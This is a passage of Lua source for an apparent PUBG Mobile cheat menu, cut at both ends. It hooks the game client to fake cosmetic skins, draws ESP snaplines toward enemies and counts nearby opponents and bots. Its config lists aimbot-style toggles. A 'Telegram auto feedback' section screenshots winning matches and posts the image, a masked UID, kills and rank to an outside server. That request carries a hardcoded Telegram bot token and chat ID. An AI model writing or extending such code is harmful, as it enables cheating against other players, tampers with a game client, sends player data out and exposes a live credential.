        F.afterInjectApply(firstLobby)
        return
    end
    local tries = 0
    local function retry()
        tries = tries + 1
        if F.injectAll() then
            local ft = not _G.AddOutfitLobbyInitDone
            if ft then _G.AddOutfitLobbyInitDone = true end
            F.afterInjectApply(ft)
            return
        end
        if tries < INJECT_RETRY_MAX then F.later(INJECT_RETRY_SEC, retry) end
    end
    F.later(INJECT_RETRY_SEC, retry)
end

_G.AddOutfit = F
F.start()

-- [FIX VIP] SISTEM OTOMATIS PULIHKAN SKIN DI LOBI SAAT BARU BUKA GAME
_G.AddOutfitLobbyRestored = false

local function AutoRestoreLobbySkin()
    if _G.AddOutfitLobbyRestored then return end
    
    -- [BENDERA TIDUR LOBBY]: Jika sudah naik pesawat masuk pertandingan -> Tidur, tidak baca file Lobi lagi!
    if _G.AddOutfit and _G.AddOutfit.isInRealMatch() then return end
    
    pcall(function()
        if GameStatus and GameStatus.IsInLobbyOrMainCity and GameStatus.IsInLobbyOrMainCity() then
            -- Tunggu DataMgr selesai load UID karakter (Cegah error load terlalu cepat)
            if DataMgr and DataMgr.roleData and DataMgr.roleData.uid then
                local LMC = require("client.slua.logic.lobby.Main.Lobby_Main_Control")
                if LMC and LMC.GetCurPage then
                    if _G.AddOutfit and _G.AddOutfit.reapplyLobbyEquipped then
                        -- Kirim bertubi-tubi: Baca File -> Beri Data -> Gambar ke karakter
                        _G.AddOutfit.persistLoadFromDisk() 
                        _G.AddOutfit.persistApplyLoaded() 
                        _G.AddOutfit.reapplyLobbyEquipped() 
                        
                        -- Kunci bendera sudah selesai
                        _G.AddOutfitLobbyRestored = true
                    end
                end
            end
        end
    end)
end

-- Jalankan diam-diam 1 detik / kali saat masuk game, setelah selesai otomatis berhenti
pcall(function()
    local ticker = require("common.time_ticker")
    if ticker and ticker.AddTimerLoop then
        ticker.AddTimerLoop(0, AutoRestoreLobbySkin, -1, 1.0)
    end
end)
-- ==============================================================================
-- ================= AKHIR CORE ADD-OUTFIT V7.5 (SISTEM SKIN) ==============
-- ==============================================================================

-- ==============================================================================
-- ================= AKHIR CORE ADD-OUTFIT V7.5 (SISTEM SKIN) ==============
-- ==============================================================================

-- ==============================================================================
-- ================= MULAI LOGIC MOD EMOTE (HANYA INGAME - 0% DROP FPS) =========
-- ==============================================================================


-- ==============================================================================
-- INTEGRASI MainLoop (paste ke dalam MainLoop saat player valid)
-- Hanya jalan jika ModSkin aktif + AddOutfit sudah load
-- ==============================================================================
--[[
    if _G.LexusConfig and _G.LexusConfig.ModSkin and _G.AddOutfit then
        if _G.AddOutfit.isInRealMatch() then
            _G.AddOutfitLobbyRestored = false
            local ticker = require("common.time_ticker")
            if ticker and ticker.AddTimerOnce then
                _G.AddOutfit.matchApplyAllSlots(localPlayer)
                ticker.AddTimerOnce(0.2, function()
                    if slua.isValid(localPlayer) and _G.AddOutfit.isInRealMatch() then
                        _G.AddOutfit.matchApplyHat(localPlayer)
                    end
                end)
                ticker.AddTimerOnce(0.4, function()
                    if slua.isValid(localPlayer) and _G.AddOutfit.isInRealMatch() then
                        _G.AddOutfit.matchApplyWeaponSkin(localPlayer)
                    end
                end)
                ticker.AddTimerOnce(0.6, function()
                    if slua.isValid(localPlayer) and _G.AddOutfit.isInRealMatch()
                        and _G.AddOutfit.isCharacterAirborne(localPlayer) then
                        _G.AddOutfit.applyAirborneSlots(localPlayer, true)
                    end
                end)
            else
                _G.AddOutfit.matchApplyAllSlots(localPlayer)
                _G.AddOutfit.matchApplyHat(localPlayer)
                _G.AddOutfit.matchApplyWeaponSkin(localPlayer)
                if _G.AddOutfit.isCharacterAirborne(localPlayer) then
                    _G.AddOutfit.applyAirborneSlots(localPlayer, true)
                end
            end
        else
            _G.AddOutfit.reapplyLobbyEquipped()
        end
    end
]]

-- ==============================================================================
-- MENU TOGGLE (StackSkin) — skin only
-- ==============================================================================
--[[
{ Key = "ModMenu_ModSkin", UI = AliasMap.Switcher,
  Text = T("Sistem Mod Skin VIP (Buka tas/inventory)", "VIP Mod Skin (Open inventory)"),
  GetFunc = function() return _G.LexusConfig.ModSkin end,
  SetFunc = function(c,v) _G.LexusConfig.ModSkin = v return true end },
{ Key = "ModMenu_SkinDeadBox", UI = AliasMap.Switcher,
  Text = T("Skin Peti Mati (ikut senjata)", "Deadbox Skin"),
  GetFunc = function() return _G.LexusConfig.SkinDeadBox end,
  SetFunc = function(c,v) _G.LexusConfig.SkinDeadBox = v return true end },
{ Key = "ModMenu_SkinAttachment", UI = AliasMap.Switcher,
  Text = T("Skin Attachment Senjata", "Weapon Attachment Skin"),
  GetFunc = function() return _G.LexusConfig.SkinAttachment end,
  SetFunc = function(c,v) _G.LexusConfig.SkinAttachment = v return true end },
]]

-- ============================================================================
-- END PUT SKIN ONLY
-- ============================================================================


-- ==============================================================================
-- PUT CONFIG PERSIST (ModSkin / KillCountUI / Skin flags) — survive reload
-- ==============================================================================
do
    local KEYS = {
        "ModSkin", "SkinDeadBox", "SkinAttachment", "SkinOpenLink",
        "KillCountUI", "KillMessage", "ModEmote", "BulletTrack",
        "EspVip", "AutoHead", "UnlockFPS",
    }
    local PATHS = {
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_cfg.dat",
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_cfg.dat",
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_cfg.dat",
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_cfg.dat",
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_cfg.dat",
    }

    local function encode()
        local t = {}
        if not _G.LexusConfig then return "" end
        for _, k in ipairs(KEYS) do
            local v = _G.LexusConfig[k]
            if v ~= nil then
                t[#t+1] = k .. "=" .. (v and "1" or "0")
            end
        end
        return table.concat(t, ";")
    end

    local function decode(s)
        if not s or s == "" then return end
        _G.LexusConfig = _G.LexusConfig or {}
        for part in string.gmatch(s, "[^;]+") do
            local k, v = part:match("^([%w_]+)=([01])$")
            if k then
                _G.LexusConfig[k] = (v == "1")
            end
        end
    end

    _G.PUT_SaveConfig = function()
        pcall(function()
            local data = encode()
            if data == "" then return end
            for _, path in ipairs(PATHS) do
                local f = io.open(path, "w")
                if f then
                    f:write(data)
                    f:close()
                    break
                end
            end
        end)
    end

    _G.PUT_LoadConfig = function()
        pcall(function()
            for _, path in ipairs(PATHS) do
                local f = io.open(path, "r")
                if f then
                    local s = f:read("*a")
                    f:close()
                    if s and #s > 0 then
                        decode(s)
                        break
                    end
                end
            end
        end)
    end

    -- load ASAP
    pcall(_G.PUT_LoadConfig)

    -- auto-save every 5s if dirty
    local lastSnap = ""
    pcall(function()
        local ticker = require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(0, function()
                pcall(function()
                    local snap = encode()
                    if snap ~= lastSnap and snap ~= "" then
                        lastSnap = snap
                        _G.PUT_SaveConfig()
                    end
                end)
            end, -1, 5.0)
        end
    end)
end


-- ==============================================================================
-- PUT: Backpack/Tas weapon icon pakai skin ID (bukan default)
-- ==============================================================================
pcall(function()
    if _G._PUT_BackpackSkinHooked then return end
    _G._PUT_BackpackSkinHooked = true

    local function skinIdForWeapon(weapon)
        if not weapon or not slua.isValid(weapon) then return nil end
        local skinId = nil
        pcall(function()
            if weapon.synData and weapon.synData.Get then
                local d = weapon.synData:Get(7)
                if d then
                    local def = slua.IndexReference(d, "defineID")
                    if def and def.TypeSpecificID then
                        local id = tonumber(def.TypeSpecificID) or 0
                        if id > 1000000 then skinId = id end
                    end
                end
            end
        end)
        if skinId then return skinId end
        pcall(function()
            local wac = weapon.WeaponAvatarComponent
            if wac and wac.CachedLoadedID and wac.CachedLoadedID > 1000000 then
                skinId = wac.CachedLoadedID
            end
        end)
        return skinId
    end

    local ok, mod = pcall(require, "GameLua.Mod.BaseMod.Client.Backpack.MainWeaponInfoItemUI")
    if ok and mod and mod.__inner_impl then
        local impl = mod.__inner_impl
        for _, fname in ipairs({"SetWeaponInfo", "UpdateWeaponInfo", "RefreshItem", "OnRefresh", "SetItemData", "UpdateUI"}) do
            if type(impl[fname]) == "function" and not impl["_PUT_orig_" .. fname] then
                impl["_PUT_orig_" .. fname] = impl[fname]
                local orig = impl[fname]
                impl[fname] = function(self, ...)
                    local args = {...}
                    pcall(function()
                        if not (_G.LexusConfig and _G.LexusConfig.ModSkin) then return end
                        local w = self.Weapon or self.weapon or self.CurWeapon
                        if not w and self.GetWeapon then w = self:GetWeapon() end
                        local sid = skinIdForWeapon(w)
                        if sid and self.WeaponID then self.WeaponID = sid end
                        if sid and self.AvatarID then self.AvatarID = sid end
                        if sid and self.ItemID then self.ItemID = sid end
                    end)
                    return orig(self, ...)
                end
            end
        end
    end

    -- Switch weapon slot icons
    pcall(function()
        local Slot = require("GameLua.Mod.BaseMod.Client.MainControlUI.SwitchWeaponSlotMode2")
        if Slot and Slot.__inner_impl then
            local impl = Slot.__inner_impl
            for _, fname in ipairs({"UpdateWeapon", "RefreshSlot", "SetWeapon", "OnWeaponChange"}) do
                if type(impl[fname]) == "function" and not impl["_PUT_orig_" .. fname] then
                    impl["_PUT_orig_" .. fname] = impl[fname]
                    local orig = impl[fname]
                    impl[fname] = function(self, ...)
                        local r = orig(self, ...)
                        pcall(function()
                            if not (_G.LexusConfig and _G.LexusConfig.ModSkin) then return end
                            if _G.equip_weapon_avatar and GameplayData then
                                local p = GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
                                if p then _G.equip_weapon_avatar(p) end
                            end
                        end)
                        return r
                    end
                end
            end
        end
    end)
end)


-- ==========================================

-- ==========================================
-- SNAPLINE UMG (screen-space solid line) — tanpa C++
-- Pakai Image/Border tipis dirotasi dari head → top center
-- ==========================================
do
    local LINE_BP = "/Game/UMG/UI_BP/Common/BaseComponent/CommonBaseComponent_TextButton_UIBP.CommonBaseComponent_TextButton_UIBP"
    local pool = {}
    local poolN = 0
    local MAX_LINES = 24

    local function ensureLine(i)
        if pool[i] and slua.isValid(pool[i]) then return pool[i] end
        local w = nil
        pcall(function()
            w = slua.loadUI(LINE_BP)
            if not w or not slua.isValid(w) then return end
            pcall(function()
                require("game_frontend_hud").AddToContainer(UIContainers.Top, w, 10400)
            end)
            -- kecilkan teks, biar kelihatan seperti batang
            pcall(function()
                if w.RichText_Content then
                    w.RichText_Content:SetText("")
                end
            end)
            pcall(function()
                local WidgetLayoutLibrary = import("WidgetLayoutLibrary")
                local slot = WidgetLayoutLibrary.SlotAsCanvasSlot(w)
                if slot then
                    slot:SetAnchors(FAnchors(0, 0, 0, 0))
                    slot:SetAlignment(FVector2D(0.5, 0.5))
                    slot:SetSize(FVector2D(4, 4))
                end
            end)
            pool[i] = w
        end)
        return pool[i]
    end

    function _G.PUT_FlushSnapLines()
        pcall(function()
            local cfg = _G.LexusConfig
            if not cfg or not cfg.EspAntenna then
                for i = 1, poolN do
                    local w = pool[i]
                    if w and slua.isValid(w) then
                        pcall(function() w:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
                    end
                end
                _G.__PUT_SNAP_QUEUE = {}
                return
            end

            local q = _G.__PUT_SNAP_QUEUE or {}
            _G.__PUT_SNAP_QUEUE = {}

            local ui_util = require("client.common.ui_util")
            local vp = ui_util and ui_util.GetViewportSize and ui_util.GetViewportSize()
            local cx = (vp and vp.X or 1080) * 0.5
            local cy = 18
            local thickness = 3.5

            local n = #q
            if n > MAX_LINES then n = MAX_LINES end
            if n > poolN then poolN = n end

            for i = 1, n do
                local pt = q[i]
                local w = ensureLine(i)
                if not (w and slua.isValid(w)) then goto cont end

                local x1, y1 = pt.x, pt.y
                local x2, y2 = cx, cy
                local dx, dy = x2 - x1, y2 - y1
                local len = math.sqrt(dx * dx + dy * dy)
                if len < 2 then
                    w:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
                    goto cont
                end
                local angle = math.deg(math.atan2(dy, dx))
                local mx = (x1 + x2) * 0.5
                local my = (y1 + y2) * 0.5

                pcall(function()
                    local WidgetLayoutLibrary = import("WidgetLayoutLibrary")
                    local slot = WidgetLayoutLibrary.SlotAsCanvasSlot(w)
                    if slot then
                        slot:SetPosition(FVector2D(mx, my))
                        slot:SetSize(FVector2D(len, thickness))
                    end
                    if w.SetRenderTransformAngle then
                        w:SetRenderTransformAngle(angle)
                    elseif w.SetRenderTransform then
                        -- fallback
                    end
                    -- putih via color kalau ada
                    pcall(function()
                        if w.SetColorAndOpacity then
                            w:SetColorAndOpacity({R=1,G=1,B=1,A=1})
                        end
                        if w.RichText_Content then
                            w.RichText_Content:SetText(" ")
                        end
                    end)
                    w:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                end)
                ::cont::
            end

            for i = n + 1, poolN do
                local w = pool[i]
                if w and slua.isValid(w) then
                    pcall(function() w:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
                end
            end
        end)
    end

    -- juga flush di ticker biar tetap jalan
    pcall(function()
        if _G.__PUT_SNAP_LOOP then return end
        _G.__PUT_SNAP_LOOP = true
        local ticker = require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(0, function()
                if _G.PUT_FlushSnapLines then _G.PUT_FlushSnapLines() end
            end, -1, 0.03)
        end
    end)
end



-- ==========================================
-- ENEMY COUNTER (BOX + TEKS) — UMG top center
-- ==========================================
do
    local BTN_BP = "/Game/UMG/UI_BP/Common/BaseComponent/CommonBaseComponent_TextButton_UIBP.CommonBaseComponent_TextButton_UIBP"
    local EnemyCounterWidget = nil
    local LastCounterTime = 0

    local function IsBot(pawn)
        if not pawn or not slua.isValid(pawn) then return false end
        if pawn.bIsAI == true or pawn.IsAI == true then return true end
        if type(pawn.IsBot) == "function" then
            local ok, r = pcall(function() return pawn:IsBot() end)
            if ok and r then return true end
        end
        local ps = pawn.PlayerState
        if ps and slua.isValid(ps) then
            if ps.bIsABot == true or ps.bIsBot == true then return true end
            if type(ps.IsBot) == "function" then
                local ok, r = pcall(function() return ps:IsBot() end)
                if ok and r then return true end
            end
        end
        return false
    end

    function _G.CleanUpEnemyCounterWidget()
        if EnemyCounterWidget and slua.isValid(EnemyCounterWidget) then
            pcall(function() EnemyCounterWidget:RemoveFromParent() end)
        end
        EnemyCounterWidget = nil
    end


    function _G.DrawEnemyCounter()
        pcall(function()
            local cfg = _G.LexusConfig or _G.PUTConfig
            if not cfg then return end
            -- saklar: EspVip (ESP1) / EspLoai7 / EspAntenna / Esp7_SoLuong
            local on = cfg.EspVip or cfg.EspLoai7 or cfg.EspAntenna
            if cfg.Esp7_SoLuong == false and not cfg.EspVip and not cfg.EspAntenna then
                on = false
            end
            if not on then
                if EnemyCounterWidget and slua.isValid(EnemyCounterWidget) then
                    EnemyCounterWidget:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
                end
                return
            end

            local now = os.clock()
            if now - LastCounterTime < 0.25 then return end
            LastCounterTime = now

            local GD = require("GameLua.GameCore.Data.GameplayData")
            local localPlayer = GD.GetPlayerCharacter and GD.GetPlayerCharacter()
            if not (localPlayer and slua.isValid(localPlayer)) then return end

            local allChars = nil
            pcall(function()
                if GD.GetAllPlayerCharacters then allChars = GD.GetAllPlayerCharacters()
                elseif GD.GetAllCharacters then allChars = GD.GetAllCharacters()
                elseif GD.GameCharacters then allChars = GD.GameCharacters end
            end)
            if not allChars then return end

            local count, botCount, nearest = 0, 0, 99999
            local myTeam = localPlayer.TeamID
            local myLoc = nil
            pcall(function() myLoc = localPlayer:K2_GetActorLocation() end)

            for _, enemy in pairs(allChars) do
                if enemy and slua.isValid(enemy) and enemy ~= localPlayer then
                    local sameTeam = false
                    pcall(function() sameTeam = (enemy.TeamID == myTeam) end)
                    if not sameTeam then
                        local dead = false
                        pcall(function()
                            if type(enemy.IsDead) == "function" then dead = enemy:IsDead() end
                            if enemy.HealthStatus == 2 then dead = true end
                        end)
                        if not dead then
                            count = count + 1
                            if IsBot(enemy) then botCount = botCount + 1 end
                            if myLoc then
                                pcall(function()
                                    local eLoc = enemy:K2_GetActorLocation()
                                    if eLoc then
                                        local dx = eLoc.X - myLoc.X
                                        local dy = eLoc.Y - myLoc.Y
                                        local dz = eLoc.Z - myLoc.Z
                                        local dist = math.sqrt(dx*dx + dy*dy + dz*dz) / 100
                                        if dist < nearest then nearest = dist end
                                    end
                                end)
                            end
                        end
                    end
                end
            end

            local widget = CreateEnemyCounterWidget()
            if widget and slua.isValid(widget) then
                widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                if widget.RichText_Content then
                    local nearM = (count > 0) and math.floor(nearest) or 0
                    widget.RichText_Content:SetText(
                        string.format("Enemies : %d I Bots : %d", count, botCount, nearM)
                    )
                end
            end
        end)
    end

    pcall(function()
        if _G.__ENEMY_COUNTER_LOOP then return end
        _G.__ENEMY_COUNTER_LOOP = true
        local ticker = require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(0, function()
                if _G.DrawEnemyCounter then _G.DrawEnemyCounter() end
            end, -1, 0.3)
        end
    end)
end

-- ==============================================================================
-- ==================== TELEGRAM AUTO FEEDBACK (BY SHADOW  ====================
-- ==============================================================================

local AutoFeedback = {
	Config = {
		ServerURL = "https://shayan-tool-connect.choudharyshayan786.workers.dev",
		TestMode = false
	},
	Hooked = false
}

local function AF_Log(message)
	print(string.format("[SHAYAN][%s] %s", os.date("%H:%M:%S"), tostring(message)))
end

local function AF_Notify(message)
	if _G.SRCHUBNotify then
		pcall(_G.SRCHUBNotify, message)
	end
end

local function AF_GetModule(name, allowRequire)
	local loaded = package and package.loaded and package.loaded[name]
	if loaded then return loaded end
	if allowRequire == false then return nil end
	local ok, module = pcall(require, name)
	if ok then return module end
	return nil
end

local function AF_AddTimerOnce(delay, callback)
	local ticker = AF_GetModule("common.time_ticker")
	if ticker and type(ticker.AddTimerOnce) == "function" then
		ticker.AddTimerOnce(delay, callback)
		return true
	end
	return false
end

local function AF_Base64Encode(data)
	if type(data) ~= "string" or #data == 0 then return "" end
	local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local output = {}
	local outputIndex = 0
	local index = 1
	while index <= #data - 2 do
		local a, b, c = string.byte(data, index, index + 2)
		local value = a * 65536 + b * 256 + c
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte(alphabet, value % 64 + 1)
		)
		index = index + 3
	end
	local remaining = #data - index + 1
	if remaining == 2 then
		local a, b = string.byte(data, index, index + 1)
		local value = a * 65536 + b * 256
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte("=")
		)
	elseif remaining == 1 then
		local value = string.byte(data, index) * 65536
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte("="),
			string.byte("=")
		)
	end
	return table.concat(output)
end

local function AF_UrlEncode(value)
	if value == nil then return nil end
	value = tostring(value):gsub("\n", "\r\n")
	value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
		return string.format("%%%02X", string.byte(character))
	end)
	value = value:gsub(" ", "+")
	return value
end

local function AF_ReadFile(path)
	local file = io.open(path, "rb")
	if not file then return "" end
	local data = file:read("*a") or ""
	file:close()
	return data
end

local function AF_RemoveFile(path)
	pcall(os.remove, path)
end

local function AF_GetRankName(rank)
	if rank < 1700 then return "Bronze"
	elseif rank < 2200 then return "Silver"
	elseif rank < 2700 then return "Gold"
	elseif rank < 3200 then return "Platinum"
	elseif rank < 3700 then return "Diamond"
	elseif rank < 4200 then return "Crown"
	elseif rank < 4700 then return "Ace"
	elseif rank < 5200 then return "Ace Master"
	elseif rank < 5600 then return "Ace Dominator"
	end
	return "Conqueror"
end

local FeedbackCaptionTemplate = "<b> [ OWNER_@SHAYAN_TOOL1 ]</b>\n<pre>\nPlayer - %s\nUID    - %s\nTime   - %s\nKills  - %d\nRank   - %s\n</pre>\n[ ACTIVE - SAFE ]\n<b>Owner: @SHAYAN_TOOL1</b>"

function AutoFeedback.SendFeedback(path, kills, rank, segment)
	AF_Log("Preparing to send feedback. Screenshot: " .. tostring(path))
	local ok, err = pcall(function()
		local httpManager = AF_GetModule("client.slua.logic.http.http_manager")
		if not httpManager or type(httpManager.Post) ~= "function" then
			AF_Log("HTTP manager is unavailable.")
			return
		end
		local attempts = 0
		local function TrySend()
			local imageData = AF_ReadFile(path)
			if #imageData > 0 then
				local uid = "unknown"
				if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
					uid = tostring(_G.DataMgr.roleData.uid)
				elseif _G._KONG_UK then
					uid = tostring(_G._KONG_UK)
				end
				kills = tonumber(kills) or 0
				rank = tonumber(rank) or 0
				segment = tonumber(segment) or 0
				local maskedName = "*****"
				local maskedUid = "***"
				if uid ~= "unknown" and #uid > 5 then
					maskedUid = uid:sub(1, 3) .. "***" .. uid:sub(-2)
				end
				local caption = string.format(
					FeedbackCaptionTemplate,
					maskedName,
					maskedUid,
					os.date("%H:%M:%S %d/%m/%Y"),
					kills,
					AF_GetRankName(rank)
				)
				local encodedImage = AF_Base64Encode(imageData)
				encodedImage = encodedImage:gsub("%+", "%%2B")
				encodedImage = encodedImage:gsub("/", "%%2F")
				encodedImage = encodedImage:gsub("=", "%%3D")
				AF_Notify("[SRC_HUB] Uploading Top 1 screenshot to VIP Server...")
				local body = "base64_image=" .. encodedImage
					.. "&caption=" .. AF_UrlEncode(caption)
					.. "&bot_token=" .. AF_UrlEncode("8978184564:AAFnfWUq2ELwS9rDHuUvY2frG-xQngN9FyA")
					.. "&chat_id=" .. AF_UrlEncode("7821394102")
				httpManager:Post(
					AutoFeedback.Config.ServerURL,
					{["Content-Type"] = "application/x-www-form-urlencoded"},
					body,
					nil,
					function(success, _, response, errorMessage)
						if success and response and tostring(response):find('"status":%s*true') then
							AF_Notify("[SRC_HUB] Successfully sent! (Kills: " .. tostring(kills) .. ")")
						else
							local detail = tostring(response or errorMessage):sub(1, 40)
							AF_Notify("[SRC_HUB] VIP Server error: " .. detail)
						end
						AF_RemoveFile(path)
					end,
					60
				)
				return
			end
			attempts = attempts + 1
			if attempts < 5 and AF_AddTimerOnce(1.0, TrySend) then
				return
			end
			AF_Notify("[SRC_HUB] Screenshot capture failed!")
			AF_RemoveFile(path)
		end
		TrySend()
	end)
	if not ok then
		AF_Log("SendFeedback Error: " .. tostring(err))
	end
end

local AF_HudNames = {
	"BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
	"VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
	"SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
	"Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
}

local function AF_GetRankAndSegment()
	local rank = 0
	local segment = 0
	pcall(function()
		local battleResult = _G.BP_STRUCT_BattleResultData
		local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
		if rating then
			rank = tonumber(rating.rank_rating) or 0
			segment = tonumber(rating.new_segment) or 0
		end
		if rank == 0 then
			local funcUtil = AF_GetModule("common.func_util")
			local roleData = _G.DataMgr and _G.DataMgr.roleData
			if funcUtil and type(funcUtil.GetCurMaxSegementLevel) == "function"
				and roleData and roleData.allzoneSegment then
				segment = tonumber(funcUtil.GetCurMaxSegementLevel(roleData.allzoneSegment)) or 0
			end
			if roleData and roleData.segment_rating then
				for _, value in pairs(roleData.segment_rating) do
					if type(value) == "table" then
						for _, nestedValue in pairs(value) do
							if type(nestedValue) == "number" and nestedValue > rank then
								rank = nestedValue
							end
						end
					elseif type(value) == "number" and value > rank then
						rank = value
					end
				end
			end
		end
	end)
	return rank, segment
end

local function AF_CreateHudController()
	local hidden = {}
	local function SetHidden(hide)
		local UIManager = _G.UIManager
		if not UIManager then return end
		if hide then
			for _, name in ipairs(AF_HudNames) do
				local config
				if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
					config = UIManager.UI_Config_InGame[name]
				elseif UIManager.UI_Config and UIManager.UI_Config[name] then
					config = UIManager.UI_Config[name]
				end
				if config then
					local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
					if view then
						pcall(function()
							if type(view.SetVisibility) == "function" then
								view:SetVisibility(2)
							elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
								view.UIRoot:SetVisibility(2)
							elseif type(UIManager.HideUI) == "function" then
								UIManager.HideUI(config)
							elseif type(UIManager.CloseUI) == "function" then
								UIManager.CloseUI(config)
							end
						end)
						table.insert(hidden, {config = config, view = view})
					end
				end
			end
			return
		end
		for _, item in ipairs(hidden) do
			pcall(function()
				if item.view and type(item.view.SetVisibility) == "function" then
					item.view:SetVisibility(0)
				elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
					item.view.UIRoot:SetVisibility(0)
				elseif type(UIManager.ShowUI) == "function" then
					UIManager.ShowUI(item.config)
				end
			end)
		end
		hidden = {}
	end
	return SetHidden
end

local function AF_GetScreenshotDirectory()
	local directories = {}
	local home = os.getenv("HOME")
	if home and home ~= "" then
		table.insert(directories, home .. "/Documents/ShadowTrackerExtra/Saved/")
	end
	local packages = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
	for _, packageName in ipairs(packages) do
		table.insert(directories,
			"/storage/emulated/0/Android/data/" .. packageName
			.. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
	end
	local selected = directories[1]
	for _, directory in ipairs(directories) do
		local testPath = directory .. "t.tmp"
		local file = io.open(testPath, "w")
		if file then
			file:close()
			os.remove(testPath)
			selected = directory
			break
		end
	end
	return selected
end

local function AF_CaptureAndSend(kills, rank, segment, restoreHud)
	local restored = false
	local function RestoreHudOnce()
		if not restored then
			restored = true
			restoreHud(false)
		end
	end
	local ScreenshotMaker = import("ScreenshotMaker")
	if not ScreenshotMaker then RestoreHudOnce(); return end
	local directory = AF_GetScreenshotDirectory()
	if not directory then RestoreHudOnce(); return end
	local path = directory .. string.format("kongwin_%s.jpg", os.time())
	local uiUtil = AF_GetModule("client.common.ui_util")
	local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
	local enginePreTick = gameInstance and gameInstance.EnginePreTick
	if not enginePreTick or type(enginePreTick.Add) ~= "function" then
		RestoreHudOnce(); return
	end
	local ticker = AF_GetModule("common.time_ticker")
	if not ticker or type(ticker.AddTimerOnce) ~= "function" then
		RestoreHudOnce(); return
	end
	enginePreTick:Add(function()
		local actualPath = ScreenshotMaker.MakePictureByName(path, true)
		if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
		if actualPath and actualPath ~= "" then path = actualPath end
		local attempts = 0
		local function CheckCapture()
			attempts = attempts + 1
			local captured = false
			pcall(function() captured = ScreenshotMaker.HasCaptured(path) end)
			if captured then
				RestoreHudOnce()
				AF_Log("HasCaptured=true. Flushing to disk via ResizePicture...")
				pcall(ScreenshotMaker.ResizePicture, path, 0.9, path)
				ticker.AddTimerOnce(2.0, function()
					if #AF_ReadFile(path) > 0 then
						AutoFeedback.SendFeedback(path, kills, rank, segment)
					else
						AF_Notify("[SRC_HUB] iOS image read error!")
					end
				end)
			elseif attempts < 15 then
				ticker.AddTimerOnce(1, CheckCapture)
			else
				RestoreHudOnce()
				AF_Notify("[SRC_HUB] Screenshot capture failed!")
			end
		end
		ticker.AddTimerOnce(1, CheckCapture)
	end)
end

function AutoFeedback.ProcessWin(kills)
	kills = tonumber(kills) or 0
	local rank, segment = AF_GetRankAndSegment()
	-- ✅ ALL RANKS SUPPORTED - Sirf kills check (kills > 0)
	if kills <= 0 then
		AF_Log(string.format("Skipping feedback: Kill %d (Requires Kill > 0)", kills))
		return
	end
	AF_Notify("[SRC_HUB] Congratulations on getting TOP 1! Rank: " .. AF_GetRankName(rank))
	local setHudHidden = AF_CreateHudController()
	setHudHidden(true)
	local ok, err = pcall(AF_CaptureAndSend, kills, rank, segment, setHudHidden)
	if not ok then
		setHudHidden(false)
		AF_Log("ProcessWin Error: " .. tostring(err))
	end
end

local function AF_GetWinnerKills()
	local kills = 0
	pcall(function()
		local likeUtil = AF_GetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
		if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
			local playerState = likeUtil.GetMyPlayerState()
			if playerState and playerState.Kills then
				kills = tonumber(playerState.Kills) or 0
			end
		end
		if kills == 0 then
			local resultLogic = AF_GetModule(
				"GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic",
				false
			)
			if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
				local result = resultLogic:GetBattleResultData()
				if result and result.BP_mykill then
